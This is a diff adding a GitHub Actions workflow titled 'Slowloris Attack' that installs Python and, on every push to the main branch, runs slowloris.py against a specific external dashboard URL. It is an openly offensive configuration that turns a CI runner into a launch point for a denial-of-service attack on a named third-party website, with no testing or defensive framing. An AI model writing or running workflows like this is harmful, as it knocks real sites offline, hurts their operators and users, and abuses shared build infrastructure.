@@ -1,0 +1,24 @@
+name: Slowloris Attack
+
+on:
+  push:
+    branches:
+      - main  # Adjust according to your branch name
+
+jobs:
+  slowloris-attack:
+    runs-on: ubuntu-latest  # You can choose a different OS if needed
+
+    steps:
+    - name: Checkout Repository
+      uses: actions/checkout@v2  # This action checks out your repository
+
+    - name: Install Python
+      uses: actions/setup-python@v2
+      with:
+        python-version: '3.x'  # Ensure Python 3.x is installed
+
+    - name: Run Slowloris Attack
+      working-directory: ./slowloris  # Change directory to slowloris
+      run: |
+        python3 slowloris.py https://weop.ir/0/dashboard/
